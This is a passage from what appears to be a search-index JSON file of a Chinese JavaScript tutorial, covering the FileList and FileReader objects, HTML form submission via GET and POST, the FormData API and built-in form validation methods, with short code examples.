\uff0c\u7528\u6765\u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b9e\u4f8b\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u4f4d\u7f6e\u7684\u5e8f\u53f7\uff08\u4ece\u96f6\u5f00\u59cb\uff09\u3002\u4f46\u662f\uff0c\u7531\u4e8e FileList \u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u5373 myFileList[0] \u7b49\u540c\u4e8e myFileList.item(0) \uff0c\u6240\u4ee5\u4e00\u822c\u7528\u4e0d\u5230 item() \u65b9\u6cd5\u3002","title":"FileList \u5bf9\u8c61"},{"location":"bom/file/#filereader","text":"FileReader \u5bf9\u8c61\u7528\u4e8e\u8bfb\u53d6 File \u5bf9\u8c61\u6216 Blob \u5bf9\u8c61\u6240\u5305\u542b\u7684\u6587\u4ef6\u5185\u5bb9\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a FileReader \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 FileReader \u5b9e\u4f8b\u3002 1 var reader = new FileReader (); FileReader \u6709\u4ee5\u4e0b\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 FileReader.error\uff1a\u8bfb\u53d6\u6587\u4ef6\u65f6\u4ea7\u751f\u7684\u9519\u8bef\u5bf9\u8c61 FileReader.readyState\uff1a\u6574\u6570\uff0c\u8868\u793a\u8bfb\u53d6\u6587\u4ef6\u65f6\u7684\u5f53\u524d\u72b6\u6001\u3002\u4e00\u5171\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u72b6\u6001\uff0c 0 \u8868\u793a\u5c1a\u672a\u52a0\u8f7d\u4efb\u4f55\u6570\u636e\uff0c 1 \u8868\u793a\u6570\u636e\u6b63\u5728\u52a0\u8f7d\uff0c 2 \u8868\u793a\u52a0\u8f7d\u5b8c\u6210\u3002 FileReader.result\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u6709\u53ef\u80fd\u662f\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u4e2a ArrayBuffer \u5b9e\u4f8b\u3002 FileReader.onabort\uff1a abort \u4e8b\u4ef6\uff08\u7528\u6237\u7ec8\u6b62\u8bfb\u53d6\u64cd\u4f5c\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onerror\uff1a error \u4e8b\u4ef6\uff08\u8bfb\u53d6\u9519\u8bef\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onload\uff1a load \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570\uff0c\u901a\u5e38\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\u9762\u4f7f\u7528 result \u5c5e\u6027\uff0c\u62ff\u5230\u6587\u4ef6\u5185\u5bb9\u3002 FileReader.onloadstart\uff1a loadstart \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u5f00\u59cb\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onloadend\uff1a loadend \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u7ed3\u675f\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onprogress\uff1a progress \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u8fdb\u884c\u4e2d\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u76d1\u542c load \u4e8b\u4ef6\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" onchange=\"onChange(event)\"> function onChange ( event ) { var file = event . target . files [ 0 ]; var reader = new FileReader (); reader . onload = function ( event ) { console . log ( event . target . result ) }; reader . readAsText ( file ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u5f53\u6587\u4ef6\u63a7\u4ef6\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u5c1d\u8bd5\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u6587\u4ef6\u3002\u5982\u679c\u8bfb\u53d6\u6210\u529f\uff08 load \u4e8b\u4ef6\u53d1\u751f\uff09\uff0c\u5c31\u6253\u5370\u51fa\u6587\u4ef6\u5185\u5bb9\u3002 FileReader \u6709\u4ee5\u4e0b\u5b9e\u4f8b\u65b9\u6cd5\u3002 FileReader.abort()\uff1a\u7ec8\u6b62\u8bfb\u53d6\u64cd\u4f5c\uff0c readyState \u5c5e\u6027\u5c06\u53d8\u6210 2 \u3002 FileReader.readAsArrayBuffer()\uff1a\u4ee5 ArrayBuffer \u7684\u683c\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u8bfb\u53d6\u5b8c\u6210\u540e result \u5c5e\u6027\u5c06\u8fd4\u56de\u4e00\u4e2a ArrayBuffer \u5b9e\u4f8b\u3002 FileReader.readAsBinaryString()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c result \u5c5e\u6027\u5c06\u8fd4\u56de\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002 FileReader.readAsDataURL()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c result \u5c5e\u6027\u5c06\u8fd4\u56de\u4e00\u4e2a Data URL \u683c\u5f0f\uff08Base64 \u7f16\u7801\uff09\u7684\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u6587\u4ef6\u5185\u5bb9\u3002\u5bf9\u4e8e\u56fe\u7247\u6587\u4ef6\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u7528\u4e8e <img> \u5143\u7d20\u7684 src \u5c5e\u6027\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e0d\u80fd\u76f4\u63a5\u8fdb\u884c Base64 \u89e3\u7801\uff0c\u5fc5\u987b\u628a\u524d\u7f00 data:*/*;base64, \u4ece\u5b57\u7b26\u4e32\u91cc\u5220\u9664\u4ee5\u540e\uff0c\u518d\u8fdb\u884c\u89e3\u7801\u3002 FileReader.readAsText()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c result \u5c5e\u6027\u5c06\u8fd4\u56de\u6587\u4ef6\u5185\u5bb9\u7684\u6587\u672c\u5b57\u7b26\u4e32\u3002\u8be5\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4ee3\u8868\u6587\u4ef6\u7684 Blob \u5b9e\u4f8b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u6587\u672c\u7f16\u7801\uff0c\u9ed8\u8ba4\u4e3a UTF-8\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /* HTML \u4ee3\u7801\u5982\u4e0b <input type=\"file\" onchange=\"previewFile()\"> <img src=\"\" height=\"200\"> */ function previewFile () { var preview = document . querySelector ( 'img' ); var file = document . querySelector ( 'input[type=file]' ). files [ 0 ]; var reader = new FileReader (); reader . addEventListener ( 'load' , function () { preview . src = reader . result ; }, false ); if ( file ) { reader . readAsDataURL ( file ); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u9009\u4e2d\u56fe\u7247\u6587\u4ef6\u4ee5\u540e\uff0c\u811a\u672c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u7136\u540e\u4f5c\u4e3a\u4e00\u4e2a Data URL \u8d4b\u503c\u7ed9 <img> \u5143\u7d20\u7684 src \u5c5e\u6027\uff0c\u4ece\u800c\u628a\u56fe\u7247\u5c55\u793a\u51fa\u6765\u3002","title":"FileReader \u5bf9\u8c61"},{"location":"bom/form/","text":"\u8868\u5355\uff0cFormData \u5bf9\u8c61 \u00b6 \u8868\u5355\u6982\u8ff0 \u00b6 \u8868\u5355\uff08 <form> \uff09\u7528\u6765\u6536\u96c6\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u6bd4\u5982\uff0c\u7528\u6237\u63d0\u4ea4\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u8ba9\u670d\u52a1\u5668\u9a8c\u8bc1\uff0c\u5c31\u8981\u901a\u8fc7\u8868\u5355\u3002\u8868\u5355\u63d0\u4f9b\u591a\u79cd\u63a7\u4ef6\uff0c\u8ba9\u5f00\u53d1\u8005\u4f7f\u7528\uff0c\u5177\u4f53\u7684\u63a7\u4ef6\u79cd\u7c7b\u548c\u7528\u6cd5\u8bf7\u53c2\u8003 HTML \u8bed\u8a00\u7684\u6559\u7a0b\u3002\u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd JavaScript \u4e0e\u8868\u5355\u7684\u4ea4\u4e92\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 < form action = \"/handling-page\" method = \"post\" > < div > < label for = \"name\" > \u7528\u6237\u540d\uff1a </ label > < input type = \"text\" id = \"name\" name = \"user_name\" /> </ div > < div > < label for = \"passwd\" > \u5bc6\u7801\uff1a </ label > < input type = \"password\" id = \"passwd\" name = \"user_passwd\" /> </ div > < div > < input type = \"submit\" id = \"submit\" name = \"submit_button\" value = \"\u63d0\u4ea4\" /> </ div > </ form > \u4e0a\u9762\u4ee3\u7801\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8868\u5355\uff0c\u5305\u542b\u4e09\u4e2a\u63a7\u4ef6\uff1a\u7528\u6237\u540d\u8f93\u5165\u6846\u3001\u5bc6\u7801\u8f93\u5165\u6846\u548c\u63d0\u4ea4\u6309\u94ae\u3002 \u7528\u6237\u70b9\u51fb\u201c\u63d0\u4ea4\u201d\u6309\u94ae\uff0c\u6bcf\u4e00\u4e2a\u63a7\u4ef6\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u952e\u540d\u662f\u63a7\u4ef6\u7684 name \u5c5e\u6027\uff0c\u952e\u503c\u662f\u63a7\u4ef6\u7684 value \u5c5e\u6027\uff0c\u952e\u540d\u548c\u952e\u503c\u4e4b\u95f4\u7531\u7b49\u53f7\u8fde\u63a5\u3002\u6bd4\u5982\uff0c\u7528\u6237\u540d\u8f93\u5165\u6846\u7684 name \u5c5e\u6027\u662f user_name \uff0c value \u5c5e\u6027\u662f\u7528\u6237\u8f93\u5165\u7684\u503c\uff0c\u5047\u5b9a\u662f\u201c\u5f20\u4e09\u201d\uff0c\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u952e\u503c\u5bf9 user_name=\u5f20\u4e09 \u3002 \u6240\u6709\u7684\u952e\u503c\u5bf9\u90fd\u4f1a\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u3002\u4f46\u662f\uff0c\u63d0\u4ea4\u7684\u6570\u636e\u683c\u5f0f\u8ddf <form> \u5143\u7d20\u7684 method \u5c5e\u6027\u6709\u5173\u3002\u8be5\u5c5e\u6027\u6307\u5b9a\u4e86\u63d0\u4ea4\u6570\u636e\u7684 HTTP \u65b9\u6cd5\u3002\u5982\u679c\u662f GET \u65b9\u6cd5\uff0c\u6240\u6709\u952e\u503c\u5bf9\u4f1a\u4ee5 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u63d0\u4ea4\u5230\u670d\u52a1\u5668\uff0c\u6bd4\u5982 /handling-page?user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 \u3002\u4e0b\u9762\u5c31\u662f GET \u8bf7\u6c42\u7684 HTTP \u5934\u4fe1\u606f\u3002 1 2 GET /handling-page?user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 Host: example.com \u5982\u679c\u662f POST \u65b9\u6cd5\uff0c\u6240\u6709\u952e\u503c\u5bf9\u4f1a\u8fde\u63a5\u6210\u4e00\u884c\uff0c\u4f5c\u4e3a HTTP \u8bf7\u6c42\u7684\u6570\u636e\u4f53\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u6bd4\u5982 user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 \u3002\u4e0b\u9762\u5c31\u662f POST \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002 1 2 3 4 5 6 POST /handling-page HTTP / 1.1 Host : example.com Content-Type : application/x-www-form-urlencoded Content-Length : 74 user_name=\u5f20\u4e09&user_passwd=123&submit_button=\u63d0\u4ea4 \u6ce8\u610f\uff0c\u5b9e\u9645\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u53ea\u8981\u952e\u503c\u4e0d\u662f URL \u7684\u5408\u6cd5\u5b57\u7b26\uff08\u6bd4\u5982\u6c49\u5b57\u201c\u5f20\u4e09\u201d\u548c\u201c\u63d0\u4ea4\u201d\uff09\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002 \u70b9\u51fb submit \u63a7\u4ef6\uff0c\u5c31\u53ef\u4ee5\u63d0\u4ea4\u8868\u5355\u3002 1 2 3 < form > < input type = \"submit\" value = \"\u63d0\u4ea4\" > </ form > \u4e0a\u9762\u8868\u5355\u5c31\u5305\u542b\u4e00\u4e2a submit \u63a7\u4ef6\uff0c\u70b9\u51fb\u8fd9\u4e2a\u63a7\u4ef6\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u628a\u8868\u5355\u6570\u636e\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u3002 \u6ce8\u610f\uff0c\u8868\u5355\u91cc\u9762\u7684 <button> \u5143\u7d20\u5982\u679c\u6ca1\u6709\u7528 type \u5c5e\u6027\u6307\u5b9a\u7c7b\u578b\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f submit \u63a7\u4ef6\u3002 1 2 3 < form > < button > \u63d0\u4ea4 </ button > </ form > \u4e0a\u9762\u8868\u5355\u7684 <button> \u5143\u7d20\uff0c\u70b9\u51fb\u4ee5\u540e\u4e5f\u4f1a\u63d0\u4ea4\u8868\u5355\u3002 \u9664\u4e86\u70b9\u51fb submit \u63a7\u4ef6\u63d0\u4ea4\u8868\u5355\uff0c\u8fd8\u53ef\u4ee5\u7528\u8868\u5355\u5143\u7d20\u7684 submit() \u65b9\u6cd5\uff0c\u901a\u8fc7\u811a\u672c\u63d0\u4ea4\u8868\u5355\u3002 1 formElement . submit (); \u8868\u5355\u5143\u7d20\u7684 reset() \u65b9\u6cd5\u53ef\u4ee5\u91cd\u7f6e\u6240\u6709\u63a7\u4ef6\u7684\u503c\uff08\u91cd\u7f6e\u4e3a\u9ed8\u8ba4\u503c\uff09\u3002 1 formElement . reset () FormData \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 \u8868\u5355\u6570\u636e\u4ee5\u952e\u503c\u5bf9\u7684\u5f62\u5f0f\u5411\u670d\u52a1\u5668\u53d1\u9001\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u5b8c\u6210\u7684\u3002\u4f46\u662f\u6709\u65f6\u5019\uff0c\u6211\u4eec\u5e0c\u671b\u901a\u8fc7\u811a\u672c\u5b8c\u6210\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u6784\u9020\u6216\u7f16\u8f91\u8868\u5355\u7684\u952e\u503c\u5bf9\uff0c\u7136\u540e\u901a\u8fc7\u811a\u672c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e86 FormData \u5bf9\u8c61\u6765\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\u3002 FormData() \u9996\u5148\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u8868\u5355\u7684\u5b9e\u4f8b\u3002 1 var formdata = new FormData ( form ); FormData() \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a DOM \u7684\u8868\u5355\u5143\u7d20\uff0c\u6784\u9020\u51fd\u6570\u4f1a\u81ea\u52a8\u5904\u7406\u8868\u5355\u7684\u952e\u503c\u5bf9\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c\u7701\u7565\u8be5\u53c2\u6570\uff0c\u5c31\u8868\u793a\u4e00\u4e2a\u7a7a\u7684\u8868\u5355\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u8868\u5355\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 < form id = \"myForm\" name = \"myForm\" > < div > < label for = \"username\" > \u7528\u6237\u540d\uff1a </ label > < input type = \"text\" id = \"username\" name = \"username\" > </ div > < div > < label for = \"useracc\" > \u8d26\u53f7\uff1a </ label > < input type = \"text\" id = \"useracc\" name = \"useracc\" > </ div > < div > < label for = \"userfile\" > \u4e0a\u4f20\u6587\u4ef6\uff1a </ label > < input type = \"file\" id = \"userfile\" name = \"userfile\" > </ div > < input type = \"submit\" value = \"Submit!\" > </ form > \u6211\u4eec\u7528 FormData() \u5904\u7406\u4e0a\u9762\u8fd9\u4e2a\u8868\u5355\u3002 1 2 3 4 5 6 7 8 9 10 var myForm = document . getElementById ( 'myForm' ); var formData = new FormData ( myForm ); // \u83b7\u53d6\u67d0\u4e2a\u63a7\u4ef6\u7684\u503c formData . get ( 'username' ) // \"\" // \u8bbe\u7f6e\u67d0\u4e2a\u63a7\u4ef6\u7684\u503c formData . set ( 'username' , '\u5f20\u4e09' ); formData . get ( 'username' ) // \"\u5f20\u4e09\" \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 FormData \u63d0\u4f9b\u4ee5\u4e0b\u5b9e\u4f8b\u65b9\u6cd5\u3002 FormData.get(key) \uff1a\u83b7\u53d6\u6307\u5b9a\u952e\u540d\u5bf9\u5e94\u7684\u952e\u503c\uff0c\u53c2\u6570\u4e3a\u952e\u540d\u3002\u5982\u679c\u6709\u591a\u4e2a\u540c\u540d\u7684\u952e\u503c\u5bf9\uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u952e\u503c\u5bf9\u7684\u952e\u503c\u3002 FormData.getAll(key) \uff1a\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u8868\u793a\u6307\u5b9a\u952e\u540d\u5bf9\u5e94\u7684\u6240\u6709\u952e\u503c\u3002\u5982\u679c\u6709\u591a\u4e2a\u540c\u540d\u7684\u952e\u503c\u5bf9\uff0c\u6570\u7ec4\u4f1a\u5305\u542b\u6240\u6709\u7684\u952e\u503c\u3002 FormData.set(key, value) \uff1a\u8bbe\u7f6e\u6307\u5b9a\u952e\u540d\u7684\u952e\u503c\uff0c\u53c2\u6570\u4e3a\u952e\u540d\u3002\u5982\u679c\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u4f1a\u6dfb\u52a0\u8fd9\u4e2a\u952e\u503c\u5bf9\uff0c\u5426\u5219\u4f1a\u66f4\u65b0\u6307\u5b9a\u952e\u540d\u7684\u952e\u503c\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6587\u4ef6\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u6587\u4ef6\u540d\u3002 FormData.delete(key) \uff1a\u5220\u9664\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u53c2\u6570\u4e3a\u952e\u540d\u3002 FormData.append(key, value) \uff1a\u6dfb\u52a0\u4e00\u4e2a\u952e\u503c\u5bf9\u3002\u5982\u679c\u952e\u540d\u91cd\u590d\uff0c\u5219\u4f1a\u751f\u6210\u4e24\u4e2a\u76f8\u540c\u952e\u540d\u7684\u952e\u503c\u5bf9\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6587\u4ef6\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u6587\u4ef6\u540d\u3002 FormData.has(key) \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5177\u6709\u8be5\u952e\u540d\u7684\u952e\u503c\u5bf9\u3002 FormData.keys() \uff1a\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u4e8e for...of \u5faa\u73af\u904d\u5386\u6240\u6709\u7684\u952e\u540d\u3002 FormData.values() \uff1a\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u4e8e for...of \u5faa\u73af\u904d\u5386\u6240\u6709\u7684\u952e\u503c\u3002 FormData.entries() \uff1a\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u4e8e for...of \u5faa\u73af\u904d\u5386\u6240\u6709\u7684\u952e\u503c\u5bf9\u3002\u5982\u679c\u76f4\u63a5\u7528 for...of \u5faa\u73af\u904d\u5386 FormData \u5b9e\u4f8b\uff0c\u9ed8\u8ba4\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 \u4e0b\u9762\u662f get() \u3001 getAll() \u3001 set() \u3001 append() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var formData = new FormData (); formData . set ( 'username' , '\u5f20\u4e09' ); formData . append ( 'username' , '\u674e\u56db' ); formData . get ( 'username' ) // \"\u5f20\u4e09\" formData . getAll ( 'username' ) // [\"\u5f20\u4e09\", \"\u674e\u56db\"] formData . append ( 'userpic[]' , myFileInput . files [ 0 ], 'user1.jpg' ); formData . append ( 'userpic[]' , myFileInput . files [ 1 ], 'user2.jpg' ); \u4e0b\u9762\u662f\u904d\u5386\u5668\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var formData = new FormData (); formData . append ( 'key1' , 'value1' ); formData . append ( 'key2' , 'value2' ); for ( var key of formData . keys ()) { console . log ( key ); } // \"key1\" // \"key2\" for ( var value of formData . values ()) { console . log ( value ); } // \"value1\" // \"value2\" for ( var pair of formData . entries ()) { console . log ( pair [ 0 ] + ': ' + pair [ 1 ]); } // key1: value1 // key2: value2 // \u7b49\u540c\u4e8e\u904d\u5386 formData.entries() for ( var pair of formData ) { console . log ( pair [ 0 ] + ': ' + pair [ 1 ]); } // key1: value1 // key2: value2 \u8868\u5355\u7684\u5185\u7f6e\u9a8c\u8bc1 \u00b6 \u81ea\u52a8\u6821\u9a8c \u00b6 \u8868\u5355\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u5f00\u53d1\u8005\u6307\u5b9a\u4e00\u4e9b\u6761\u4ef6\uff0c\u5b83\u4f1a\u81ea\u52a8\u9a8c\u8bc1\u5404\u4e2a\u8868\u5355\u63a7\u4ef6\u7684\u503c\u662f\u5426\u7b26\u5408\u6761\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <!-- \u5fc5\u586b --> < input required > <!-- \u5fc5\u987b\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f --> < input pattern = \"banana|cherry\" > <!-- \u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u4e3a6\u4e2a\u5b57\u7b26 --> < input minlength = \"6\" maxlength = \"6\" > <!-- \u6570\u503c\u5fc5\u987b\u57281\u523010\u4e4b\u95f4 --> < input type = \"number\" min = \"1\" max = \"10\" > <!-- \u5fc5\u987b\u586b\u5165 Email \u5730\u5740 --> < input type = \"email\" > <!-- \u5fc5\u987b\u586b\u5165 URL --> < input type = \"URL\" > \u5982\u679c\u4e00\u4e2a\u63a7\u4ef6\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5b83\u5c31\u4f1a\u5339\u914d :valid \u7684 CSS \u4f2a\u7c7b\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ee7\u7eed\u8fdb\u884c\u8868\u5355\u63d0\u4ea4\u7684\u6d41\u7a0b\u3002\u5982\u679c\u6ca1\u6709\u901a\u8fc7\u9a8c\u8bc1\uff0c\u8be5\u63a7\u4ef6\u5c31\u4f1a\u5339\u914d :invalid \u7684 CSS \u4f2a\u7c7b\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ec8\u6b62\u8868\u5355\u63d0\u4ea4\uff0c\u5e76\u663e\u793a\u4e00\u4e2a\u9519\u8bef\u4fe1\u606f\u3002 1 2 3 4 5 6 7 input : invalid { border-color : red ; } input , input : valid { border-color : #ccc ; } checkValidity() \u00b6 \u9664\u4e86\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u81ea\u52a8\u6821\u9a8c\u8868\u5355\uff0c\u8fd8\u53ef\u4ee5\u624b\u52a8\u89e6\u53d1\u8868\u5355\u7684\u6821\u9a8c\u3002\u8868\u5355\u5143\u7d20\u548c\u8868\u5355\u63a7\u4ef6\u90fd\u6709 checkValidity() \u65b9\u6cd5\uff0c\u7528\u4e8e\u624b\u52a8\u89e6\u53d1\u6821\u9a8c\u3002 1 2 3 4 5 // \u89e6\u53d1\u6574\u4e2a\u8868\u5355\u7684\u6821\u9a8c form . checkValidity () // \u89e6\u53d1\u5355\u4e2a\u8868\u5355\u63a7\u4ef6\u7684\u6821\u9a8c formControl . checkValidity () checkValidity() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c true \u8868\u793a\u901a\u8fc7\u6821\u9a8c\uff0c false \u8868\u793a\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\u3002\u56e0\u6b64\uff0c\u63d0\u4ea4\u8868\u5355\u53ef\u4ee5\u5c01\u88c5\u4e3a\u4e0b\u9762\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 function submitForm ( action ) { var form = document . getElementById ( 'form' ); form . action = action ; if ( form . checkValidity ()) { form . submit (); } } willValidate \u5c5e\u6027 \u00b6 \u63a7\u4ef6\u5143\u7d20\u7684 willValidate \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u63a7\u4ef6\u662f\u5426\u4f1a\u5728\u63d0\u4ea4\u65f6\u8fdb\u884c\u6821\u9a8c\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <form novalidate> // <input id=\"name\" name=\"name\" required /> // </form> var input = document . querySelector ( '#name' ); input . willValidate // true validationMessage \u5c5e\u6027 \u00b6 \u63a7\u4ef6\u5143\u7d20\u7684 validationMessage \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63a7\u4ef6\u4e0d\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6\u65f6\uff0c\u6d4f\u89c8\u5668\u663e\u793a\u7684\u63d0\u793a\u6587\u672c\u3002\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 \u8be5\u63a7\u4ef6\u4e0d\u4f1a\u5728\u63d0\u4ea4\u65f6\u81ea\u52a8\u6821\u9a8c \u8be5\u63a7\u4ef6\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <form><input type=\"text\" required></form> document . querySelector ( 'form input' ). validationMessage // \"\u8bf7\u586b\u5199\u6b64\u5b57\u6bb5\u3002\" \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 var myInput = document . getElementById ( 'myinput' ); if ( ! myInput . checkValidity ()) { document . getElementById ( 'prompt' ). innerHTML = myInput . validationMessage ; } setCustomValidity() \u00b6 \u63a7\u4ef6\u5143\u7d20\u7684 setCustomValidity() \u65b9\u6cd5\u7528\u6765\u5b9a\u5236\u6821\u9a8c\u5931\u8d25\u65f6\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5b57\u7b26\u4e32\u5c31\u662f\u5b9a\u5236\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u4e0a\u6b21\u8bbe\u7f6e\u7684\u62a5\u9519\u4fe1\u606f\u88ab\u6e05\u9664\u3002 